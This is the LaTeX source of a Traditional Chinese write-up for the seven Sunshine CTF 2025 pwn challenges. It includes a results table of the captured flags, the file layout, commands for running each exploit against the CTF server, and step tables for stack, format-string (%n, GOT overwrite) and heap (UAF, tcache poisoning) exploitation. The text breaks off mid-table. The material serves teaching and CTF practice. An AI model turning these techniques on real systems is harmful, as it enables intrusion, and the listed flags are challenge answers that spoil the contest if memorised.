%=============================================================================
%  Sunshine CTF 2025 pwn write-up — XeLaTeX template
%=============================================================================
\documentclass[10pt,a4paper]{article}

% ---------- 版面幾何 ----------
\usepackage[top=2.1cm,bottom=1.9cm,left=1.7cm,right=1.7cm,headsep=0.45cm,footskip=0.95cm]{geometry}

% ---------- 字型（XeLaTeX + xeCJK）----------
\usepackage{xeCJK}
\setCJKmainfont{Noto Sans CJK TC}
\setCJKsansfont{Noto Sans CJK TC}
\setCJKmonofont{Noto Sans Mono CJK TC}
\setmainfont{Noto Sans CJK TC}
\setsansfont{Noto Sans CJK TC}

% ---- 等寬字型：ASCII 圖表對齊的關鍵 ----
% 圖表是以「製表符號 = 1 格、CJK = 2 格」繪製的（終端機慣例）。
% Noto Sans Mono CJK 的製表符號是 1.0em（= 2 格），會把方框拉寬弄壞，
% 所以這裡拆成兩套字型：
%   Latin + 製表符號 → JetBrains Mono（Latin 0.6em、製表符號 0.6em，兩者同寬）
%   CJK              → Noto Sans Mono CJK（1.0em，Scale 1.2 後 = 1.2em = 2 x 0.6em）
% 如此 CJK 恰好是 Latin 的 2 倍寬，ASCII 方框圖才能精準對齊。
\setmonofont[Scale=1.0]{JetBrains Mono}
\setCJKmonofont[Scale=1.2]{Noto Sans Mono CJK TC}

% 由 build_pdf.py 自動產生的字元分類表：凡是 JetBrains Mono 有涵蓋的字元
% （Latin、製表符號、箭頭、幾何圖形…）都歸到 Default class 用半寬渲染；
% 其餘（CJK 表意文字、全形標點）留在 CJK class 用全寬渲染。
% 由 build_pdf.py 自動產生：以下字元交給 \setmonofont（JetBrains Mono，半寬）渲染。
% 其餘非 ASCII 字元留在 CJK class，由 \setCJKmonofont 渲染（全寬 = 2 倍寬），
% 這樣 ASCII 圖表中的「製表符號 1 格、CJK 2 格」才會精準對齊。
\xeCJKDeclareCharClass{Default}{"00A7, "00B1 -> "00B2, "00B9, "00D7, "2013 -> "2014, "2026, "2190 -> "2193, "21D2, "2212, "2248, "2260 -> "2261, "2264 -> "2265}
\xeCJKDeclareCharClass{Default}{"2500, "2502, "250C, "2510, "2514, "2518, "251C, "2524, "252C, "2534, "2592, "25B2}
\xeCJKDeclareCharClass{Default}{"25B6, "25BA, "25BC, "25C4, "2713, "2717, "2736}


% 中文斷行與標點
\xeCJKsetup{
  CheckSingle = false,
  CJKecglue = {},   % 一定要是 0！xeCJK 的中西文自動間距會在程式碼區塊裡，
                  % 每個「中文緊鄰英數」的邊界偷偷插 0.42pt，
                  % ASCII 方框圖的右邊框就會歪掉。
}
\XeTeXlinebreaklocale "zh"
\XeTeXlinebreakskip = 0pt plus 1pt
\linespread{1.13}

% 關閉 LaTeX 自動章節編號：文件標題本身已帶編號（如「4.3.1」），
% 內文的「見 §4.3」交互參照才對得上。
\setcounter{secnumdepth}{-1}

% ---------- 顏色 ----------
\usepackage{xcolor}
\definecolor{dshblue}{HTML}{1F4E79}
\definecolor{dshcyan}{HTML}{1B6B7A}
\definecolor{dshgray}{HTML}{555555}
\definecolor{dshrule}{HTML}{B8C4D0}
\definecolor{codebg}{HTML}{F6F7F9}
\definecolor{codeframe}{HTML}{D8DEE6}
\definecolor{linkblue}{HTML}{0B5FA5}
\definecolor{quotebar}{HTML}{5B8DB8}

% ---------- 表格 ----------
\usepackage{calc}   % pandoc 的表格寬度使用 \real{}，由 calc 提供
\usepackage{longtable,booktabs,array}
% pandoc 輸出 {\def\LTcaptype{none} ...} 來抑制表格編號；
% 因此必須存在一個名為 none 的 counter，否則 LaTeX 會報 "No counter 'none' defined"
\newcounter{none}
\usepackage{etoolbox}
\renewcommand{\arraystretch}{1.28}
\setlength{\tabcolsep}{5pt}
\AtBeginEnvironment{longtable}{\small}
\AtBeginEnvironment{tabular}{\small}
\setlength{\LTpre}{0.7em}
\setlength{\LTpost}{0.7em}

% ---------- 程式碼區塊 ----------
\usepackage{fvextra}
\fvset{
  fontsize=\fontsize{7.0}{9.5}\selectfont,
  breaklines=true,
  breakanywhere=true,
  breakautoindent=false,
  frame=none,
  numbers=none,
  samepage=false,
}
\usepackage{framed}
\colorlet{shadecolor}{codebg}

% pandoc 產生的程式碼高亮巨集（必須先載入，才會定義 Shaded）
\usepackage{color}
\usepackage{fancyvrb}
\newcommand{\VerbBar}{|}
\newcommand{\VERB}{\Verb[commandchars=\\\{\}]}
\DefineVerbatimEnvironment{Highlighting}{Verbatim}{breaklines,breakanywhere,commandchars=\\\{\}}
% Add ',fontsize=\small' for more characters per line
\usepackage{framed}
\definecolor{shadecolor}{RGB}{248,248,248}
\newenvironment{Shaded}{\begin{snugshade}}{\end{snugshade}}
\newcommand{\AlertTok}[1]{\textcolor[rgb]{0.94,0.16,0.16}{#1}}
\newcommand{\AnnotationTok}[1]{\textcolor[rgb]{0.56,0.35,0.01}{\textbf{\textit{#1}}}}
\newcommand{\AttributeTok}[1]{\textcolor[rgb]{0.13,0.29,0.53}{#1}}
\newcommand{\BaseNTok}[1]{\textcolor[rgb]{0.00,0.00,0.81}{#1}}
\newcommand{\BuiltInTok}[1]{#1}
\newcommand{\CharTok}[1]{\textcolor[rgb]{0.31,0.60,0.02}{#1}}
\newcommand{\CommentTok}[1]{\textcolor[rgb]{0.56,0.35,0.01}{\textit{#1}}}
\newcommand{\CommentVarTok}[1]{\textcolor[rgb]{0.56,0.35,0.01}{\textbf{\textit{#1}}}}
\newcommand{\ConstantTok}[1]{\textcolor[rgb]{0.56,0.35,0.01}{#1}}
\newcommand{\ControlFlowTok}[1]{\textcolor[rgb]{0.13,0.29,0.53}{\textbf{#1}}}
\newcommand{\DataTypeTok}[1]{\textcolor[rgb]{0.13,0.29,0.53}{#1}}
\newcommand{\DecValTok}[1]{\textcolor[rgb]{0.00,0.00,0.81}{#1}}
\newcommand{\DocumentationTok}[1]{\textcolor[rgb]{0.56,0.35,0.01}{\textbf{\textit{#1}}}}
\newcommand{\ErrorTok}[1]{\textcolor[rgb]{0.64,0.00,0.00}{\textbf{#1}}}
\newcommand{\ExtensionTok}[1]{#1}
\newcommand{\FloatTok}[1]{\textcolor[rgb]{0.00,0.00,0.81}{#1}}
\newcommand{\FunctionTok}[1]{\textcolor[rgb]{0.13,0.29,0.53}{\textbf{#1}}}
\newcommand{\ImportTok}[1]{#1}
\newcommand{\InformationTok}[1]{\textcolor[rgb]{0.56,0.35,0.01}{\textbf{\textit{#1}}}}
\newcommand{\KeywordTok}[1]{\textcolor[rgb]{0.13,0.29,0.53}{\textbf{#1}}}
\newcommand{\NormalTok}[1]{#1}
\newcommand{\OperatorTok}[1]{\textcolor[rgb]{0.81,0.36,0.00}{\textbf{#1}}}
\newcommand{\OtherTok}[1]{\textcolor[rgb]{0.56,0.35,0.01}{#1}}
\newcommand{\PreprocessorTok}[1]{\textcolor[rgb]{0.56,0.35,0.01}{\textit{#1}}}
\newcommand{\RegionMarkerTok}[1]{#1}
\newcommand{\SpecialCharTok}[1]{\textcolor[rgb]{0.81,0.36,0.00}{\textbf{#1}}}
\newcommand{\SpecialStringTok}[1]{\textcolor[rgb]{0.31,0.60,0.02}{#1}}
\newcommand{\StringTok}[1]{\textcolor[rgb]{0.31,0.60,0.02}{#1}}
\newcommand{\VariableTok}[1]{\textcolor[rgb]{0.00,0.00,0.00}{#1}}
\newcommand{\VerbatimStringTok}[1]{\textcolor[rgb]{0.31,0.60,0.02}{#1}}
\newcommand{\WarningTok}[1]{\textcolor[rgb]{0.56,0.35,0.01}{\textbf{\textit{#1}}}}

\renewenvironment{Shaded}{%
  \def\FrameCommand{\fboxsep=3.2pt\colorbox{shadecolor}}%
  \MakeFramed{\advance\hsize-\width\FrameRestore\small}%
}{%
  \endMakeFramed
}

% ---------- 標題樣式 ----------
\usepackage{titlesec}
\titleformat{\section}{\normalfont\Large\bfseries\color{dshblue}}{\thesection}{0.6em}{}
\titleformat{\subsection}{\normalfont\large\bfseries\color{dshcyan}}{\thesubsection}{0.6em}{}
\titleformat{\subsubsection}{\normalfont\normalsize\bfseries\color{dshgray}}{\thesubsubsection}{0.6em}{}
\titleformat{\paragraph}[runin]{\normalfont\normalsize\bfseries}{}{0em}{}[~]
\titlespacing*{\section}{0pt}{1.6em}{0.55em}
\titlespacing*{\subsection}{0pt}{1.15em}{0.4em}
\titlespacing*{\subsubsection}{0pt}{0.9em}{0.3em}

% ---------- 頁眉頁腳 ----------
\usepackage{fancyhdr}
\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{\footnotesize\color{dshgray}Sunshine CTF 2025 — pwn 全 7 題 Write-up}
\fancyhead[R]{\footnotesize\color{dshgray}\leftmark}
\fancyfoot[C]{\footnotesize\color{dshgray}\thepage}
\renewcommand{\headrulewidth}{0.35pt}
\renewcommand{\footrulewidth}{0pt}
\renewcommand{\headrule}{\hbox to\headwidth{\color{dshrule}\leaders\hrule height \headrulewidth\hfill}}
\fancypagestyle{plain}{\fancyhf{}\fancyfoot[C]{\footnotesize\color{dshgray}\thepage}\renewcommand{\headrulewidth}{0pt}}
% 讓 \section 更新頁眉
\renewcommand{\sectionmark}[1]{\markboth{#1}{}}

% ---------- pandoc 需要的巨集 ----------
\providecommand{\tightlist}{%
  \setlength{\itemsep}{0pt}\setlength{\parskip}{0pt}}
\providecommand{\passthrough}[1]{#1}
\providecommand{\pandocbounded}[1]{#1}
\newenvironment{CSLReferences}[2]{}{}
\providecommand{\CSLBlock}[1]{#1\hfill\break}
\providecommand{\CSLLeftMargin}[1]{\parbox[t]{\csllmwidth}{#1}}
\newlength{\csllmwidth}
\setlength{\csllmwidth}{0pt}

% ---------- 引言區塊 ----------
\usepackage{mdframed}
\renewenvironment{quote}{%
  \begin{mdframed}[linewidth=0pt,innerleftmargin=0pt,innerrightmargin=0pt,
    innerbottommargin=0pt,innertopmargin=0pt,skipabove=0.55em,skipbelow=0.55em,
    leftmargin=0.9em,rightmargin=0.4em,startcode={\color{quotebar}\vrule width 2.6pt},%
    endcode={}]%
  \itshape\color{black}%
}{%
  \end{mdframed}%
}

% ---------- 清單 ----------
\usepackage{enumitem}
\setlist[itemize]{topsep=0.28em,itemsep=0.12em,parsep=0.1em,leftmargin=1.5em}
\setlist[enumerate]{topsep=0.28em,itemsep=0.12em,parsep=0.1em,leftmargin=1.7em}

% ---------- 連結 ----------
\usepackage[hidelinks,bookmarks=true,bookmarksnumbered=true]{hyperref}
\hypersetup{
  colorlinks=true,
  linkcolor=linkblue,
  urlcolor=linkblue,
  citecolor=linkblue,
  pdftitle={Sunshine CTF 2025 --- pwn 全 7 題完整 Write-up},
  pdfauthor={Sunshine CTF 2025 pwn write-up},
  pdfsubject={CTF pwn write-up},
  pdfcreator={pandoc + XeLaTeX},
  bookmarksopen=true,
  bookmarksopenlevel=1,
  breaklinks=true,
}

% ---------- 破折號、省略號等 ----------
\usepackage{amssymb}
\usepackage{pifont}
\usepackage{newunicodechar}
% ✓ / ✗：Noto Sans CJK 的 Latin script slot 沒有這兩個字，改用 pifont 的 Zapf Dingbats
\newunicodechar{✓}{\ding{51}}
\newunicodechar{✗}{\ding{55}}
\newunicodechar{★}{\ding{72}}
% 注意：絕對不要幫 ✶(U+2736) 做 newunicodechar 對應！
% ★ 在程式碼區塊內會被前處理換成 ✶，而 JetBrains Mono 的 ✶ 剛好是 1 格寬；
% 一旦換成 \ding{72}（Dingbats 的星號，比例字型），每一顆星就會多出約 1.5pt，
% ASCII 方框圖的右邊框就會歪掉。


% ---------- 標題 ----------
\title{\vspace{-1.2cm}\Huge\bfseries\color{dshblue} Sunshine CTF 2025\\[0.25em] pwn 全 7 題完整 Write-up\\[0.35em]
       \large\normalfont\color{dshgray} 從零開始：組語、漏洞成因、exploit 逐行解說}
\author{\normalsize 全部 7 題皆已對遠端 \texttt{chal.\allowbreak{}sunshinectf.\allowbreak{}games} 實打取得真實 flag}
\date{\normalsize\today}

\begin{document}
\sloppy
\emergencystretch=2.5em

{\hypersetup{linkcolor=dshblue}
\maketitle
\thispagestyle{plain}

\begin{center}
\begin{minipage}{0.9\textwidth}
\small\itshape\color{dshgray}
本文件是把 \texttt{wp/} 底下的教學文件合併成的單一 PDF。
每一題都包含：漏洞成因、逐行組合語言解說、ASCII 記憶體圖、gdb 實測輸出、
以及完整可執行的 \texttt{exploit.\allowbreak{}py} 逐行註解。
\end{minipage}
\end{center}

\vspace{0.6em}
\hrule height 0.4pt
\vspace{0.4em}

\renewcommand{\contentsname}{目錄}
\setcounter{tocdepth}{1}
\tableofcontents

\clearpage
}

\section{Part 0 ---
索引與成果總表}\label{part-0-ux7d22ux5f15ux8207ux6210ux679cux7e3dux8868}

\begin{quote}
原始檔案：\texttt{wp/\allowbreak{}README.\allowbreak{}md}
\end{quote}

\subsection{Sunshine CTF --- pwn 全 7 題
Write-up（從零開始版）}\label{sunshine-ctf-pwn-ux5168-7-ux984c-write-upux5f9eux96f6ux958bux59cbux7248}

\begin{quote}
這份 write-up 是為\textbf{沒學過 pwn、沒寫過 exploit、沒聽過 ROP/SROP}
的人寫的。 每一題都會從「這行組語在幹嘛」開始講，一路講到完整的
exploit。

遠端：\texttt{chal.\allowbreak{}sunshinectf.\allowbreak{}games}
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{※總結 成果總表（全部已取得真實
flag）}\label{ux7e3dux7d50-ux6210ux679cux7e3dux8868ux5168ux90e8ux5df2ux53d6ux5f97ux771fux5be6-flag}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 12\tabcolsep) * \real{0.1429}}
  >{\raggedright\arraybackslash}p{(\linewidth - 12\tabcolsep) * \real{0.1429}}
  >{\raggedright\arraybackslash}p{(\linewidth - 12\tabcolsep) * \real{0.1429}}
  >{\raggedright\arraybackslash}p{(\linewidth - 12\tabcolsep) * \real{0.1429}}
  >{\raggedright\arraybackslash}p{(\linewidth - 12\tabcolsep) * \real{0.1429}}
  >{\raggedright\arraybackslash}p{(\linewidth - 12\tabcolsep) * \real{0.1429}}
  >{\raggedright\arraybackslash}p{(\linewidth - 12\tabcolsep) * \real{0.1429}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
\#
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
題目
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
檔案
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
port
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
保護機制
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
核心技巧
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
Flag
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1 & \textbf{total\_recall} & \texttt{pwn1/\allowbreak{}challenge} & 26003 &
靜態、non-PIE、\textbf{NX off}、無 canary、stripped、純組語 (108 bytes)
& Stack Overflow → \textbf{SROP} &
\texttt{sun\{\allowbreak{}r3caLl\_\allowbreak{}ev3Ry\_\allowbreak{}reGist3r\_\allowbreak{}sR0p\}\allowbreak{}} \\
2 & \textbf{mad\_libs} & \texttt{pwn2/\allowbreak{}mad\_\allowbreak{}libs} & 26001 &
PIE、canary、NX、Partial RELRO & \textbf{Format String} →
\texttt{printf@GOT} 覆寫成 \texttt{system} &
\texttt{sun\{\allowbreak{}f1ll\_\allowbreak{}iN\_\allowbreak{}th3\_\allowbreak{}g0T\_\allowbreak{}eNtry\}\allowbreak{}} \\
3 & \textbf{revolution} & \texttt{pwn3/\allowbreak{}revolution} & 26002 & non-PIE、無
canary、NX、Partial RELRO & 自製 printf 的 \texttt{va\_\allowbreak{}list} 別名問題 →
任意讀 + 任意 8-byte 寫 → \texttt{strcspn@GOT} 覆寫 &
\texttt{sun\{\allowbreak{}cust0m\_\allowbreak{}fmtstr\_\allowbreak{}n0\_\allowbreak{}t00ls\_\allowbreak{}4ll0wed\}\allowbreak{}} \\
4 & \textbf{cache\_money} & \texttt{pwn4/\allowbreak{}cache\_\allowbreak{}money} & 26004 &
non-PIE、canary、NX、Partial RELRO & \textbf{Heap UAF + Double Free} →
tcache poisoning（繞 safe-linking）→ \texttt{strtol@GOT} 覆寫 &
\texttt{sun\{\allowbreak{}s4fe\_\allowbreak{}l1nk1ng\_\allowbreak{}w0nt\_\allowbreak{}s4ve\_\allowbreak{}y0ur\_\allowbreak{}tc4che\}\allowbreak{}} \\
5 & \textbf{homemaker} & \texttt{pwn5/\allowbreak{}homemaker} & 26008 &
PIE、canary、NX、\textbf{Full RELRO} & Off-by-one 改大容量 → 洩漏堆疊 →
\textbf{ROP}（\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret} + \texttt{system@plt}） &
\texttt{sun\{\allowbreak{}the\_\allowbreak{}future\_\allowbreak{}is\_\allowbreak{}now\_\allowbreak{}today\_\allowbreak{}well\_\allowbreak{}wait\_\allowbreak{}how\_\allowbreak{}are\_\allowbreak{}you\_\allowbreak{}reading\_\allowbreak{}this\}\allowbreak{}} \\
6 & \textbf{code\_breaker} & \texttt{pwn6/\allowbreak{}code\_\allowbreak{}breaker} & 26005 &
PIE、canary、NX、Partial RELRO & \textbf{Heap Double Free + UAF} →
tcache poisoning → 覆寫全域函式指標 &
\texttt{sun\{\allowbreak{}cr4ck\_\allowbreak{}tHe\_\allowbreak{}ciPh3r\_\allowbreak{}fr33\_\allowbreak{}thE\_\allowbreak{}heaP\}\allowbreak{}} \\
7 & \textbf{SafeHouse} & \texttt{pwn7/\allowbreak{}service} & 26007 & non-PIE、無
canary、NX、Full RELRO、\textbf{seccomp} & Stack pivot + 偽造 IPC 封包 +
\textbf{負索引越界} &
\texttt{sun\{\allowbreak{}n3gat1ve\_\allowbreak{}h4ndl3s\_\allowbreak{}0pen\_\allowbreak{}s3cret\_\allowbreak{}d00rs\}\allowbreak{}} \\
\end{longtable}
}

\begin{quote}
上表的 \textbf{port} 與各題 \texttt{exploit.\allowbreak{}py}、\texttt{run\_\allowbreak{}all.\allowbreak{}sh}
的設定一致； \textbf{保護機制}是逐題用
\texttt{checksec\ \allowbreak{}-\allowbreak{}\/\allowbreak{}-\allowbreak{}file=./\allowbreak{}pwnN/\allowbreak{}\textless{}\allowbreak{}binary\textgreater{}\allowbreak{}}（或
\texttt{python3\ \allowbreak{}-\allowbreak{}c\ \allowbreak{}"from\ \allowbreak{}pwn\ \allowbreak{}import\ \allowbreak{}*;\ \allowbreak{}print(ELF(\textquotesingle{}\allowbreak{}./\allowbreak{}pwnN/\allowbreak{}\textless{}\allowbreak{}binary\textgreater{}\allowbreak{}\textquotesingle{}\allowbreak{},\allowbreak{}checksec=False).\allowbreak{}checksec())"}）實跑出來的；
\textbf{Flag} 與 \texttt{pwnN/\allowbreak{}FLAG.\allowbreak{}txt} 逐字相同（7
題全部都是遠端實打到的真 flag）， 每一題也都能用
\texttt{wp/\allowbreak{}run\_\allowbreak{}all.\allowbreak{}sh\ \allowbreak{}pwnN} 重跑一次拿到同樣的結果。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{※閱讀
閱讀順序（強烈建議照這個順序）}\label{ux95b1ux8b80-ux95b1ux8b80ux9806ux5e8fux5f37ux70c8ux5efaux8b70ux7167ux9019ux500bux9806ux5e8f}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
1. wp/00_基礎知識_從零開始.md      ← 先讀這個。暫存器、組語、堆疊、PLT/GOT、ROP、SROP 全部從零教
2. pwn1/notes.md                   ← 最完整的單題教學（SROP）。所有後續題目都引用這裡的觀念
3. pwn2/notes.md                   ← Format String 從零教（%p / %N$p / %n / %hn）
4. pwn3/notes.md                   ← 更難的 format string（自製 printf、va_list 佈局）
5. pwn4/notes.md                   ← glibc heap 從零教（chunk / tcache / safe-linking / UAF / double free）
6. pwn5/notes.md                   ← PIE + canary + Full RELRO 下的完整 ROP
7. pwn6/notes.md                   ← heap + 自製 RPC 協定 + 覆寫函式指標
8. pwn7/notes.md                   ← seccomp、stack pivot、偽造二進位封包、有號數邊界檢查
9. wp/99_速查表.md                 ← 解題時放旁邊查
\end{Verbatim}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{※檔案
檔案結構}\label{ux6a94ux6848-ux6a94ux6848ux7d50ux69cb}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
sunshine/
├── wp/                                    ← 教學與審查文件全部在這裡
│   ├── README.md                          ← 你現在看的這份（索引）
│   ├── 00_基礎知識_從零開始.md              ← 從零教學（暫存器/組語/堆疊/ROP/SROP/pwntools/gdb）
│   ├── 99_速查表.md                        ← 速查表
│   ├── 00_recon.md                        ← 7 題清單／port／保護機制速查
│   ├── run_all.sh                         ← 一鍵重跑全部 7 題（打遠端）
│   ├── review_round1.md                   ← 第 1 輪審查報告
│   ├── review_round2_*.md                 ← 第 2 輪審查報告（依主題拆檔）
│   ├── review_round3_*.md                 ← 第 3 輪審查報告（依主題拆檔）
│   ├── fixes_round1_applied.md            ← 第 1 輪修正紀錄
│   ├── fixes_round2_*.md                  ← 第 2 輪修正紀錄（依主題拆檔）
│   └── pending_wp00_fixes_*.md            ← 第 2 輪回報、待套用到 `wp/00` 的項目（已套用完畢）
│
├── pwn1/  challenge  exploit.py  notes.md  FLAG.txt  flag.txt  web_migurimental.tar.gz
├── pwn2/  mad_libs  exploit.py  selfcheck.py  notes.md  FLAG.txt  flag.txt  NOTES_SUMMARY.txt
│          ld-linux-x86-64.so.2  libc.so.6
├── pwn3/  revolution  exploit.py  notes.md  FLAG.txt  flag.txt  NOTES_SUMMARY.txt
│          rev.asm  local_run.log  remote_run.log  libc-2.39-0ubuntu8.3.so.6
├── pwn4/  cache_money  exploit.py  notes.md  FLAG.txt  flag.txt  NOTES_SUMMARY.txt
│          dis.txt  cm_dbg  ld-linux-x86-64.so.2  libc.so.6  work/
├── pwn5/  homemaker  exploit.py  notes.md  FLAG.txt  flag.txt  NOTES_SUMMARY.txt
│          disasm.txt  gdb_evidence.sh  gdb_evidence.py  gdb_evidence_raw.txt
│          exploit_input.bin  remote_run.txt  scratch_leak.py
├── pwn6/  code_breaker  exploit.py  notes.md  FLAG.txt  flag.txt  NOTES_SUMMARY.txt
│          proto.py  cb.asm  cb_new.asm  ld-linux-x86-64.so.2  libc.so.6
└── pwn7/  service  exploit.py  notes.md  FLAG.txt  FLAG_REMOTE.txt  flag.txt  dis.txt
\end{Verbatim}

\begin{quote}
※ \textbf{\texttt{*} 代表「一組同前綴的檔案」}，不是真的檔名。實際檔名請
\texttt{ls\ \allowbreak{}wp/}： 第 2 輪報告是
\texttt{review\_\allowbreak{}round2\_\allowbreak{}\{\allowbreak{}stack,\allowbreak{}fmtstr,\allowbreak{}heap,\allowbreak{}rop\_\allowbreak{}foundations\}\allowbreak{}.\allowbreak{}md}， 第
3 輪報告是
\texttt{review\_\allowbreak{}round3\_\allowbreak{}\{\allowbreak{}verification,\allowbreak{}cold\_\allowbreak{}read,\allowbreak{}regression\}\allowbreak{}.\allowbreak{}md}，
修正紀錄則是
\texttt{fixes\_\allowbreak{}round2\_\allowbreak{}\{\allowbreak{}stack,\allowbreak{}fmtstr,\allowbreak{}heap,\allowbreak{}rop\_\allowbreak{}foundations,\allowbreak{}wp00\}\allowbreak{}.\allowbreak{}md}。

※ 各題目錄裡還有一些\textbf{解題過程的佐證檔}（\texttt{dis.\allowbreak{}txt} /
\texttt{rev.\allowbreak{}asm} / \texttt{*.\allowbreak{}log} / \texttt{gdb\_\allowbreak{}evidence*} /
\texttt{cm\_\allowbreak{}dbg} / \texttt{proto.\allowbreak{}py} / \texttt{NOTES\_\allowbreak{}SUMMARY.\allowbreak{}txt}
等）， 是筆記引用到的原始資料，新手可以完全不管它們。

※ \textbf{兩種 flag 檔不要搞混}： * \texttt{flag.\allowbreak{}txt} = 題目附的假
flag（本機 \texttt{cat\ \allowbreak{}flag.\allowbreak{}txt} 測試用） * \texttt{FLAG.\allowbreak{}txt} =
\textbf{遠端實打到的真 flag} ------ 7
題\textbf{全部}都有，內容與上面成果總表的 Flag 欄逐字一致 （pwn7
另外留了第一次遠端連線的 \texttt{FLAG\_\allowbreak{}REMOTE.\allowbreak{}txt}）
\end{quote}

\begin{quote}
※ \textbf{每一支 \texttt{exploit.\allowbreak{}py} 都支援兩種模式，而且不需要 TTY：}

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ pwnN}
\ExtensionTok{python3}\NormalTok{ exploit.py            }\CommentTok{\# 打本地}
\ExtensionTok{python3}\NormalTok{ exploit.py REMOTE     }\CommentTok{\# 打 chal.sunshinectf.games:\textasciigrave{}\textless{}port\textgreater{}\textasciigrave{}}
\end{Highlighting}
\end{Shaded}
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{▶ 一鍵驗證}\label{ux4e00ux9375ux9a57ux8b49}

\texttt{run\_\allowbreak{}all.\allowbreak{}sh} 放在 \texttt{wp/} 底下，所以\textbf{要在
\texttt{wp/} 目錄裡}跑（或從專案根目錄用 \texttt{wp/\allowbreak{}run\_\allowbreak{}all.\allowbreak{}sh}）：

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ wp                     }\CommentTok{\# ← 一定要先進來（或改用 ./wp/run\_all.sh）}
\ExtensionTok{./run\_all.sh}              \CommentTok{\# 跑全部 7 題}
\ExtensionTok{./run\_all.sh}\NormalTok{ pwn1 pwn4    }\CommentTok{\# 只跑指定題目}
\end{Highlighting}
\end{Shaded}

每一題都會印出 \texttt{{[}+{]}\ \allowbreak{}FLAG:\allowbreak{}\ \allowbreak{}sun\{\allowbreak{}...\allowbreak{}\}\allowbreak{}}（\texttt{pwn6}
的輸出含二進位，若用 grep 請加 \texttt{-\allowbreak{}a}）。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{※導引
三種主要技巧速覽}\label{ux5c0eux5f15-ux4e09ux7a2eux4e3bux8981ux6280ux5de7ux901fux89bd}

\paragraph{A.
堆疊類（pwn1、pwn5、pwn7）}\label{a.-ux5806ux758aux985epwn1pwn5pwn7}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
步驟
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
說明
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1. 找漏洞 & \texttt{read(0,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}太大)} / 迴圈 off-by-one \\
2. 處理 canary & 沒有 → 直接蓋返回位址；有 → 先 leak 或不碰它 \\
3. 處理 PIE & 沒有 → gadget 位址寫死；有 → 先 leak 程式碼位址 \\
4. 組鏈 & \texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret} + 字串位址 + \texttt{system@plt} 或
\texttt{syscall} \\
5. 特別情況 & 沒有 \texttt{pop\ \allowbreak{}rdi} → \textbf{SROP}；鏈太短 →
\textbf{stack pivot}；有 seccomp → 不能用
\texttt{execve}，改「借別人的手」讀 flag \\
\end{longtable}
}

\paragraph{B. Format String
類（pwn2、pwn3）}\label{b.-format-string-ux985epwn2pwn3}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
步驟
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
說明
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1. 找漏洞 & \texttt{printf(buf)} ------ 把使用者輸入當格式字串 \\
2. 定位參數 & 用 \texttt{\%\allowbreak{}1\$\allowbreak{}p\ \allowbreak{}\%\allowbreak{}2\$\allowbreak{}p\ \allowbreak{}...}
掃描，找出自己的輸入是第幾個參數 \\
3. 洩漏 & \texttt{\%\allowbreak{}N\$\allowbreak{}s}（任意位址讀）或直接 \texttt{\%\allowbreak{}N\$\allowbreak{}p}（堆疊上的
libc / canary / PIE） \\
4. 寫入 & \texttt{\%\allowbreak{}n} / \texttt{\%\allowbreak{}hn} / \texttt{\%\allowbreak{}hhn} + 把目標位址擺進
payload \\
5. 劫持 & 把 \texttt{xxx@got} 改成
\texttt{system}，之後那個函式就變成執行 shell 指令 \\
\end{longtable}
}

\paragraph{C. Heap 類（pwn4、pwn6）}\label{c.-heap-ux985epwn4pwn6}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
步驟
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
說明
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
1. 找漏洞 & \texttt{free} 之後沒清指標（UAF）、重複 \texttt{free}、size
檢查不一致 \\
2. 看懂 tcache & glibc ≥ 2.26 的 per-size 單向 bin，LIFO，每 size 最多 7
個 \\
3. 處理 safe-linking & glibc ≥ 2.32 的 \texttt{fd} 是
